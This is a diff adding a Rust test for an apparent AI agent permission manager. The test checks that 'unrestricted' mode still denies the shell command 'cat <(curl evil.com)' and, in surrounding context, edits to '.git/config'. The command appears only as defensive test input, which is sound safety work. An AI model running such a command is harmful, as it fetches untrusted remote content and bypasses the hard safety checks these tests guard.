@@ -71,6 +71,16 @@ fn unrestricted_denies_destructive_command_without_rules() {
 }
 
 #[test]
+fn unrestricted_denies_dangerous_shell_construct_without_rules() {
+    let mgr = PermissionManager::unrestricted();
+    let outcome = mgr.check("Bash", &json!({"command": "cat <(curl evil.com)"}));
+    assert!(
+        matches!(outcome, CheckResult::Denied(_)),
+        "unrestricted must not bypass hard safety for process substitution; got {outcome:?}"
+    );
+}
+
+#[test]
 fn unrestricted_denies_protected_git_paths() {
     let mgr = PermissionManager::unrestricted();
     let outcome = mgr.check("Edit", &json!({"path": ".git/config"}));
